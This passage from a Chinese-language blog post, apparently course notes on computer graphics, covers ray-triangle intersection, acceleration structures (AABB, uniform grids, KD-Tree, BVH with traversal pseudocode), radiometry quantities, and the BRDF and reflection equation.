<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020052609334887.png" alt="在这里插入图片描述" style="zoom: 50%;" loading="lazy">

<p>得到参数 $t$ 之后，自然可以计算出交点，如何判断交点是否在三角形内的问题以及多次讨论：可以用右手定则，也可以用重心坐标。但是这种方法略显繁琐，能不能一步就得到结果呢？利用重心坐标就可以：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200526093617207.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<p>重心坐标可以表示位于三角形面内的任意一点，我们直接让它等于光线表达式，求解 $t,b_1,b_2$ 即可。如何求解多项式，线性代数中克莱姆法则可以解决（当然我已经忘了）…</p>
<p>至此，whited-style光线追踪的第一个小问题得以解决。相比与光栅化中所使用的的Blinn-Phong模型，光线追踪显著了提升了图像质量，但随之而来的问题是渲染速度过慢。<strong>因为在判断光线与场景交点的时候，需要去进行所有三角形面与光线的求交，而且这仅仅是对一个像素而言</strong>。那么总体来说光是进行光线与三角形的求交这样一个计算过程就一共要： <code>像素数量*三角形面数量*弹射次数</code> 这么多次，如下图这样一个场景，一共就有10.7M的三角形面，你可以想象一共要多少次求交运算吗？</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528093734847.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>因此必须要寻求一些办法加速光线追踪的方法。</p>
<h2 id="如何加速"><a href="#如何加速" class="headerlink" title="如何加速"></a>如何加速</h2><h3 id="轴对齐包围盒（Axis-Aligned-Bounding-Box）"><a href="#轴对齐包围盒（Axis-Aligned-Bounding-Box）" class="headerlink" title="轴对齐包围盒（Axis-Aligned Bounding Box）"></a>轴对齐包围盒（Axis-Aligned Bounding Box）</h3><p>AABB（Axis-Aligned Bounding Box）的提出是十分自然的，当有的光线显然不会与一个物体相交的时候，那么自然也没有必要去遍历该物体的所有三角形面，因此利用一个包围盒包住该物体，<strong>在与该物体的三角面计算求交之前先判断光线是否与包围盒相交，倘若连包围盒都与光线没有交点的话，那么显然不会与物体的三角面有交点</strong>。</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528094537824.png" alt="img" style="zoom:50%;" loading="lazy">

<p>而所谓AABB也是一种包围盒，也是由三对平面的交集构成，只不过AABB的任意一对平面都与 $x-axis，y-axis$ 或者 $z-axis$ 垂直，所以称之为轴对齐包围盒。如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528131009255.png" alt="img" style="zoom:50%;" loading="lazy">

<p>之所以这么设置的原因是为了方便进行光线与包围盒的求交运算。那么问题就转换成了如何求光线与包围盒的交点。</p>
<p>我们以2D的AABB为例，因此只有 $x，y$ 两对平面，3D情况可类推：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528095003118.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>如上图最左边所示，求出光线与 $x$ 平面的交点，将先进入的交点（偏小的那个）记为 $t_{min}$， 后出去的交点（偏大的那个）记为 $t_{max}$，紧接着如中间图所示计算出光线与y平面的两个交点同样记为另外一组 $t_{min}$ 和 $t_{max}$，当然计算的过程中要注意如果任意的 $t &lt; 0$，那么这代表的是光线反向传播与对应平面的交点。</p>
<p>我们得到了光线与一对 $x$ 平面的交点，与一对 $y$ 平面的交点，究竟哪些点才是真正与盒子的交点呢？要明白：</p>
<p><strong>1. 只有当光线进入了所有的平面才算是真正进入了盒子中</strong><br><strong>2. 只要当光线离开了任意平面就算是真正离开了盒子</strong></p>
<p>所以对每对平面的 $t_{min}$ 和 $t_{max}$ 做如下运算：<br>$$<br>t_{enter} &#x3D;max[t_{min}]\quad \quad \quad t_{exit} &#x3D;min[t_{max}]<br>$$<br>其中 $t_{enter} &#x3D;max[t_{min}]$ 和 $t_{exit} &#x3D;min[t_{max}]$ 分别对应了上述两点条件，而对应所举的2D例子，最终求出了两个真正的与包围盒的交点如最右边图所示。图形上可以理解为两者交集。</p>
<p>光线一定会与包围盒有交点吗？显然不是，那么什么条件下才会有交点呢？</p>
<p>当 $t_{enter}&lt;t_{exit}$ 的时候，光线所在直线一定在盒子中待过一段时间，也必然存在交点。但光线并不是直线，而是射线，除了保证了光线所在的直线在盒子里待过一段时间，还要考虑实际物理意义，具体如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528101328638.png" alt="img" style="zoom:50%;" loading="lazy">

<p>当 $t_{exit}&lt;0$ 时，可以想象光的起始点是在物体之前，所以才需要反向延伸，这种情况下是不可能有交点的。而 $t_{exit}&gt;&#x3D;0， t_{enter}&lt;0$ 时，对应光的起始位置原本就在包围盒内，所以一定与之相交。综上，光线与包围盒有交点的充分必要条件为：<br>$$<br>t_{enter}&lt;t_{exit}\quad \quad \quad t_{exit}&gt;&#x3D;0<br>$$<br>包围盒也是曲面（特殊的曲面，与 $xyz$ 轴垂直），自然可以用显示曲面的方法计算交点，直接套用得到：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528101945807.png" alt="img" style="zoom: 50%;" loading="lazy">

<h3 id="均匀网格（Uniform-Grids）"><a href="#均匀网格（Uniform-Grids）" class="headerlink" title="均匀网格（Uniform Grids）"></a>均匀网格（Uniform Grids）</h3><p>现在已经可以通过事先对每个物体求一个包围盒，在与三角形面求交之前先对包围盒求交，达到不错加速效果。但是考虑这样两个极端情况：</p>
<p><strong>1. 整个场景只有一个极其复杂的单一人物模型，那么只对这一个物体做包围盒的话，相当于对效率没有任何提升</strong><br><strong>2. 整个场景充斥着大量的细小模型，如草，花之类的，每个模型可能只有很少的面，如果此时对每个物体求包围盒，得到的包围盒数量会相当之多，对于光线追踪效率来说效率提升有限</strong></p>
<p>基于以上两点考虑，<strong>AABB并不应只局限于以物体模型为单位，可以更加精细的考虑到以面为单位</strong>。另外对于场景的许许多多包围盒来说应该要有一种数据结构将其统领起来。因此如何更好的划分场景形成不同的AABB，使得划分之后的AABB能够更好的加速光线追踪，这就是接下来要考虑的问题关键！</p>
<p>最简单的划分方法，均匀网格。</p>
<p>第一步对所要考虑的场景找一个包围盒，第二步均匀划分这个大包围盒成网格，第三步在每个重叠小包围盒上存储物体模型信息，最后根据光线的方向与判断出所有相交的方格（这一步可以利用bresenham算法，移步至<a href="%5B(1%E6%9D%A1%E6%B6%88%E6%81%AF">直线光栅化</a> 计算机图形学三：光栅化-Rasterization_西电卢本伟的博客-CSDN博客](<a href="https://blog.csdn.net/lbwnbnbnbnbnbnbn/article/details/125676084?spm=1001.2014.3001.5502))%E4%BA%86%E8%A7%A3%EF%BC%89%EF%BC%8C%E5%80%98%E8%8B%A5%E6%96%B9%E6%A0%BC%E4%B8%AD%E5%AD%98%E5%82%A8%E6%9C%89%E7%89%A9%E4%BD%93%EF%BC%8C%E5%86%8D%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%B8%8E%E6%96%B9%E6%A0%BC%E4%B8%AD%E7%9A%84%E7%89%A9%E4%BD%93%E6%A8%A1%E5%9E%8B%E6%88%96%E6%98%AF%E9%9D%A2%E6%B1%82%E4%BA%A4%E3%80%82">https://blog.csdn.net/lbwnbnbnbnbnbnbn/article/details/125676084?spm=1001.2014.3001.5502))了解），倘若方格中存储有物体，再进一步与方格中的物体模型或是面求交。</a></p>
<p><img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713114520935.png" alt="image-20220713114520935" loading="lazy"></p>
<p>以上就是均匀网格划分的全部过程了，简单来说就是将空间划分为多个均匀的小的AABB，再根据光线方向找出相交grid（这一步并不需要判断所有方格，可以用brenham类似的方法来做），再判断grid中是否存储了模型信息，若有则进一步求交。（这种划分方法假设了找出相交方格要比直接判断与物体求交相对容易，因此划分方格数的多少也是性能的关键：方格太少，没有加速效果；方格太多，判断与方格的求交可能会拖累效率）</p>
<p>因此这种方法最适合的场景就是空间中均匀布满了三角形面，如下图这种场景：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200528110932164.png" alt="img" style="zoom:50%;" loading="lazy">

<p>如果说场景较为空旷，物体较小且分离得比较开，那么均匀分割的效果就会很差了，因为会有很多无效的方格与光线的求交过程。</p>
<h3 id="KD-Tree空间划分（Spatial-Partitions）"><a href="#KD-Tree空间划分（Spatial-Partitions）" class="headerlink" title="KD-Tree空间划分（Spatial Partitions）"></a>KD-Tree空间划分（Spatial Partitions）</h3><p>一些常用的空间划分方法：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020052811195387.png" alt="img" style="zoom:50%;" loading="lazy">

<p>第一种Oct-Tree，也就是八叉树，每次将空间分为8个相等的部分，再递归的对子空间进行划分。因为图中是2维例子，所以只划分了4部分。当划分的子空间足够小或是空间中三角形面的数量很少的时候会停止划分。这种方法的显著缺点是，随着维度的上升划分的空间数量会呈指数级增长。</p>
<p>第二种KD-Tree，其每次将空间划分为两部分，且划分依次沿着 $x-axis，y-axis，z-axis$ （保持最规整的空间区域），如图中所示，第一次横着将2维空间分为上下，第二次再竖着将上下两个子空间分别划分为左右部分，依次递归划分，终止条件与八叉树类似。</p>
<p>第三种BSP-Tree，其与KD-Tree类似，唯一不同的是划分不再沿着固定一轴，可以任意方向划分，缺点自然是划分的空间没有规则性，求交困难。</p>
<p>为什么这种分法叫树？看下面的KD-Tree就可以知道答案。</p>
<p>第一步将空间分为两部分，第二步对左右两个子空间换个方向再分为两部分（这里只画出了有半部分）</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713135706361.png" alt="image-20220713135706361" style="zoom: 80%;" loading="lazy">

<p>如此递归的划分下去，且在划分过程当中遵循这样几点：</p>
<p><strong>1. 依次沿着 $x-axis,y-axis,z-axis$ 划分，使得空间被划分的更加平衡</strong><br><strong>2. 划分的位置由空间中三角面的分布决定，具体细节不展开</strong><br><strong>3. 叶子节点存储对应空间的所有物体或三角面信息，中间节点仅存储指针指向两个子空间</strong><br><strong>4. 当划分空间太小或是子空间内只有少量三角形则停止划分</strong></p>
<p>当KD-Tree建立完成之后，如何进行光线与物体求交判断呢？过程如下：</p>
<p>第一步判断光线是否与最外层的包围盒相交，如果相交进一步判断是否与对应的两个子空间相交（因图中做了简化，最大包围盒的左半边并没继续进行划分，实际上应该要划分的，所以左半部分对应的1号空间是叶子节点），如果光线与之相交，进一步判断与存储与叶子节点的物体信息求交。左半边判断完之后，接着判断右半部分，同样如果对于有半部分存在相交情况，则对于右半部分的所有子空间，递归的执行这个步骤即可。</p>
<p><img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713140549132.png" alt="image-20220713140549132" loading="lazy"></p>
<p><strong>优点：</strong></p>
<p>利用KD-Tree的结构来构建AABB的好处是倘若光线与哪一部分空间不相交，那么则可以省略该部分空间所有子空间的判断过程，在原始纯粹的AABB之上更进一步提升了加速效率。</p>
<p><strong>缺点</strong>：</p>
<p>缺点是<strong>判断包围盒与三角面的是否相交较难</strong>，因此划分的过程不是那么想象的简单，其次<strong>同一个三角面可能被不同的包围盒同时占有，这两个不同包围盒内的叶节点会同时存储这一个三角形面</strong>。</p>
<p>KD-Tree划分方法技术在业界之中逐渐不再被使用，但依然有很多借鉴参考价值。</p>
<h3 id="Bounding-Volume-Hierarchy（Object-Partitions）"><a href="#Bounding-Volume-Hierarchy（Object-Partitions）" class="headerlink" title="Bounding Volume Hierarchy（Object Partitions）"></a>Bounding Volume Hierarchy（Object Partitions）</h3><p>BVH与前几种方法最显著的区别就是，<strong>不再以空间作为划分依据，而是从对象的角度考虑，即三角形面</strong>，过程如下：</p>
<p>第一步同样找出场景的整体包围盒作为根节点，第二步找到合适的划分点，将最大包围盒内的三角形面分为两部分，再分别重新就算新的包围盒，此时<strong>包围盒会重叠，但一个三角形面只会被存储在唯一的包围盒内，而这也就解决了KD-Tree的缺点！</strong></p>
<p>接下来与KD-Tree的建立类似，递归的对所有子空间重复该步骤</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/image-20220713141033794.png" alt="image-20220713141033794" style="zoom: 67%;" loading="lazy">

<p>最终可以建立出如上图的所示的树形结构，同样为了画图方便，只进行了左半部分的划分，右半部分其实同理。</p>
<p>细节：</p>
<ol>
<li>每次划分一般选择最长的那一轴划分，假设是x轴，那么划分点选择所有三角面的重心坐标在x坐标上的中位数进行划分，如此便能保证划分的三角形左右两边三角形数量尽可能差不多，<strong>当然也就使得树形结构建立的更加平衡，深度更小，平均搜索次数更少，提高了效率</strong>，学过数据结构的应该都知道。</li>
<li>与KD-Tree一样，中间节点不存储物体三角面信息，只在叶节点中存储，终止条件可设定为当前包围盒内三角形数量足够少。</li>
</ol>
<p>最后给出这样一个BVH加速结构遍历节点的伪代码参考：</p>
<pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token function">Intersect</span><span class="token punctuation">(</span>Ray ray<span class="token punctuation">,</span> BVH node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ray misses node<span class="token punctuation">.</span>bbox<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>              <span class="token comment">//光线与包围盒不相交</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>node is a leaf node <span class="token punctuation">)</span>                      <span class="token comment">//光线与包围盒相交且交点位于叶子节点</span>
		test intersection with a1l objs<span class="token punctuation">;</span>           <span class="token comment">//光线与叶子节点中存储的物体信息进行求交</span>
		<span class="token keyword">return</span> closest intersection<span class="token punctuation">;</span>
    
	hit1 <span class="token operator">=</span> <span class="token function">Intersect</span><span class="token punctuation">(</span>ray<span class="token punctuation">,</span> node<span class="token punctuation">.</span>child1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//递归计算左孩子</span>
	hit2 <span class="token operator">=</span> <span class="token function">Intersect</span><span class="token punctuation">(</span>ray<span class="token punctuation">,</span> node<span class="token punctuation">.</span>child2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//递归计算右孩子</span>
	<span class="token keyword">return</span> the closer of hit1<span class="token punctuation">,</span> hit2<span class="token punctuation">;</span>               <span class="token comment">//返回值为最近的交点</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>至此，基本的基于Whitted-Style光线追踪的知识到此为止，以下部分为进阶部分。</p>
<h1 id="辐射度量学（Radiometry）"><a href="#辐射度量学（Radiometry）" class="headerlink" title="辐射度量学（Radiometry）"></a>辐射度量学（Radiometry）</h1><h2 id="为什么突然扯这个？"><a href="#为什么突然扯这个？" class="headerlink" title="为什么突然扯这个？"></a>为什么突然扯这个？</h2><p>在Blinn-Phong模型中，我们时如何定义光线的，好像根本就没有定义。就算最基本的光的强度我们都是简单的用 $I$ 来表示。这肯定是不对。其次，上述的Whited-Style光线追踪模型，它真的是一个正确的模型吗？显然不是，原因如下：</p>
<p><strong>1. whited-style光线追踪只考虑了光滑面的镜面反射与折射，并没有对漫反射的光线进行追踪，而是直接返回当前着色点颜色</strong><br><strong>2. 在计算光源直接照射的贡献时，使用了Blinn-Phong模型，而Blinn-Phong模型本身就是一个不准确的经验模型，使用的这种模型的whited-style光线追踪自身自然也是不正确的</strong></p>
<p>为此，更好的渲染模型路径追踪出现了，而在这之前，我们必须掌握一些辐射度量学的知识，它是对光照的一套测量系统和单位，能够准确的描述光线的物理性质。</p>
<h2 id="一些必要定义"><a href="#一些必要定义" class="headerlink" title="一些必要定义"></a>一些必要定义</h2><h3 id="辐射能量（Radiant-Energy）和辐射通量-x2F-功率（Radiant-Flux-x2F-Power）"><a href="#辐射能量（Radiant-Energy）和辐射通量-x2F-功率（Radiant-Flux-x2F-Power）" class="headerlink" title="辐射能量（Radiant Energy）和辐射通量&#x2F;功率（Radiant Flux&#x2F;Power）"></a>辐射能量（Radiant Energy）和辐射通量&#x2F;功率（Radiant Flux&#x2F;Power）</h3><p>首先看一看Radiant energy的定义：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602161606617.png" alt="img" style="zoom:50%;" loading="lazy">

<p>所谓辐射能量其实非常直观，就是辐射出来的电磁能量，单位为焦耳。可以用物理当中的做功的大小来进行类比。</p>
<p>接下来是Radiant flux(power)：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602161924326.png" alt="img" style="zoom:50%;" loading="lazy">

<p>所谓辐射通量或者说辐射功率，其实就是在辐射能量的基础之上除以时间，也就是单位时间的能量。同样也可以用物理当中的功率来进行类比。</p>
<h3 id="辐射强度（Radiant-Intensity）"><a href="#辐射强度（Radiant-Intensity）" class="headerlink" title="辐射强度（Radiant Intensity）"></a>辐射强度（Radiant Intensity）</h3><p> Radiant itensity是指从一个光源出发某一方向上的亮度。看它的数学定义：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/2020060216290468.png" alt="img" style="zoom:50%;" loading="lazy">

<p>概括来说就是<strong>从光源发出的每单位立体角上的功率</strong>。立体角（solid angle）又是什么？</p>
<p>solid angle其实就是对应二维空间中圆的弧度在三维空间中球上的拓展。首先看在二维计算弧度公式如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602163858748.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>即 $\theta &#x3D; \frac{l}{r}$ (中学知识)，那么对应在三维上的球的弧度(立体角)，只需进行一个简单的扩展如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602163550415.png" alt="img" style="zoom:50%;" loading="lazy">

<p>即立体角度所对应球上的投影面积比上半径的平方，整个球的立体角为 $4\pi$（整个球的面积是 $4 \pi^2r^2$，再除以 $r^2$）。</p>
<p>那么对于Radiant intensity的定义当中，微分立体角 $d\omega$ 计算如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602164048533.png" alt="img" style="zoom:50%;" loading="lazy">

<p>这图就跟那高数书上二重积分一样一样的。首先确定空间中一个方向（通过 $\theta,\phi$），在这两个角度上分别增加一个微分值，则可以计算出如图中所示的对应到球上的投影面积。其中 $rd\theta$ 就是微分面积元的高，$rsin\theta d\phi$是微分面积元的宽，二者相乘，自然就是面积了，再根据立体角的定义除以 $r^2$ 即可得到微分立体角了。</p>
<p>上述确定空间中一个方向（通过 $\theta,\phi$），这个方向就是为 $\omega$，然后才在此基础之上分别对 $\theta,\phi$ 增加 $d\theta,d\phi$ 经计算得到最终的 $d\omega$ ，因此Radiant intensity的物理含义此时就很清楚了，为光源向某一方向所发射出的单位立体角的功率，简而言之就是光源在某个方向上的亮度。（一定要弄清，不然极有可能和下面两个概念弄混）</p>
<p>最后举一个对各向同性点光源计算Radiant intensity的例子：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602165347815.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>因为各项同性点光源所有方向上的亮度都与方向无关，因此立体角可以直接积分出来为 $4\pi$，最终计算得 $I &#x3D; \frac{\Phi}{4\pi}$。</p>
<h3 id="irradiance"><a href="#irradiance" class="headerlink" title="irradiance"></a>irradiance</h3><p>没有合适的中文翻译，直接用英文了。来看irradiance的数学定义：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602171017427.png" alt="img" style="zoom:50%;" loading="lazy">

<p>由图可见，irradiance是指<strong>每单位照射面积所接收到的power</strong>。回想Blinn-Phong模型漫反射那个部分，我们考虑光线强度与什么有关呢？是入射光线与着色点的夹角以及光线自身的强度。在入射光线与着色点的夹角这块，着重强调了我们需要乘上一个 $cos\theta$。此外，光线自身的强度越远会越加衰减：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602172100580.png" alt="img" style="zoom:50%;" loading="lazy">

<p>该现象完全可以用irradiance解释，因为光的功率始终一致，离点光源所照射到的圆球面积也就越大，因此根据irradiance的式子，分母的面积值也就越大，irradiance也就越小。</p>
<h3 id="radiance"><a href="#radiance" class="headerlink" title="radiance"></a>radiance</h3><p>最后来看radiance的定义：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602173920190.png" alt="img" style="zoom:50%;" loading="lazy">

<p>radiance就是指<strong>每单位立体角，每单位垂直面积的功率</strong>，直观来看的话，很像是Intensity和irradiance的结合。<strong>它同时指定了光的方向与照射到的表面所接受到的亮度</strong>。</p>
<p>但这里有一个细微的区别，在irradiance中定义的<strong>每单位照射面积</strong>，而在radiance当中，为了更好的使其成为描述一条光线传播中的亮度，且在传播过程当中大小不随方向改变，所以在定义中关于接收面积的部分是<strong>每单位垂直面积</strong>，而这一点的不同也正解释了图中式子分母上的 $cos\theta$ ，具体可以观察如下图：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602174516592.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>即图中的 $dA$ 是irradiance中定义所对应的，而 ${d} A^{\perp}$才是radiance中所定义的面积。二者之间的关系为${d} A^{\perp} &#x3D; dAcos\theta$。</p>
<p>在理解了radiance和irradiance的定义之后，再讨论讨论它们之间的关系，通过二者的定义式子，不难得出如下结果：<br>$$<br>L(p,\omega)&#x3D;\frac{dE(p)}{d\omega cos\theta}<br>$$<br>进一步推导得到：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602175841463.png" alt="img" style="zoom:50%;" loading="lazy">

<p>观察一下积分后的式子，$E(p)$ 就是点 $p$ 的irradiance，其物理含义是上文所提到过的点 $p$ 上<strong>每单位照射面积的功率</strong>，而 $L_i(p,\omega)$ 是radiance，指入射光<strong>每立体角，每垂直面积的功率</strong>，因此积分式子右边的 $cos\theta$ 解释了垂直面积，而对 $d\omega$ 积分，则是相当于对所有不同角度的入射光线做一个求和。那么该积分式子的物理含义便是，<strong>一个点（微分面积元）所接收到的亮度（irradiance），由所有不同方向的入射光线亮度（radiance）共同贡献得到</strong>。</p>
<h2 id="双向反射分布函数（BRDF）"><a href="#双向反射分布函数（BRDF）" class="headerlink" title="双向反射分布函数（BRDF）"></a>双向反射分布函数（BRDF）</h2><p>通过上述所有辐射度量学各种概念的定义之后，我们可以从这样一个角度理解光线的反射，如下图所示：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602183834969.png" alt="img" style="zoom:50%;" loading="lazy">

<p><strong>一个点（微分面积元）在接受到一定方向上的亮度（$dE(\omega_i)$）之后，再向不同方向把能量辐射出去（$dL_r(\omega_r)$）</strong></p>
<p>直观的理解，不同物体表面材质自然会把一定方向上的入射亮度 $dE(\omega_i)$ 反射到不同的方向的光线上 $dL_r(\omega_r)$。用上述概念解释，就是着色点所收到的irradiance经过反射产生radiance到其他方向。如理想光滑表面会把入射光线完全反射到镜面反射方向，其它方向则完全没有；如理想粗糙表面会把入射光线均匀的反射到所有方向。因此所谓<code>BRDF</code>就是描述这样一个从不同方向入射之后，反射光线分布情况的函数，定义如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602184807155.png" alt="img" style="zoom:50%;" loading="lazy">

<p>上图中下方的式子即为BRDF，它就收两个参数入射光方向 $\omega_i$，反射光方向 $\omega_r$，函数值为反射光的radiance与入射光的irradiance的比值。</p>
<p>借助BRDF，可以定义出反射方程如下：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602185152756.png" alt="img" style="zoom:50%;" loading="lazy">

<p>即摄像机所接受到的 $\omega_r$ 方向上的反射光，是由所有不同方向上入射光线的irradiance经过反射贡献得到的（图中式子的$L_{i}\left(\mathrm{p}, \omega_{i}\right) \cos \theta_{i} \mathrm{d} \omega_{i}$），而不同方向入射光线的irradiance对反射方向 $\omega_r$ 的贡献程度则由物体表面材质决定，所以乘上了一个BRDF函数。如果对上述几个物理量的定义明确的话，这个式子并不难看懂。</p>
<p>至此通过辐射度量学，以及BRDF最终得到的反射方程正是一个几乎完全正确的光照模型了。再仔细观察一下反射方程：</p>
<img src="/2022/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%85%AD%EF%BC%9A%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA-Ray-Tracing/20200602190239224.png" alt="img" style="zoom:50%;" loading="lazy">

